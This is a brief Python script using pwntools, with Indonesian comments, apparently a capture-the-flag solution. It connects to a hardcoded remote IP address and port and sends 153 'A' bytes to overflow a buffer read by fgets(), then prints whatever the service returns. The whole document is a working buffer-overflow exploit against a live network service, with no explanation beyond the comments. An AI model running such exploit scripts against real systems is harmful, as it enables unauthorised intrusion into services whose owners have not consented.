from pwn import *

# Menentukan parameter host dan port target
HOST = '167.71.207.218'
PORT =50601
#nc 167.71.207.218 50601
# Membuat koneksi ke target
r = remote(HOST, PORT)

# Mengirim input yang menyebabkan overflow pada fungsi fgets()
r.sendline(b'A' * 153)

# Membaca output dari program yang telah di-exploit
print(r.recvall().decode())
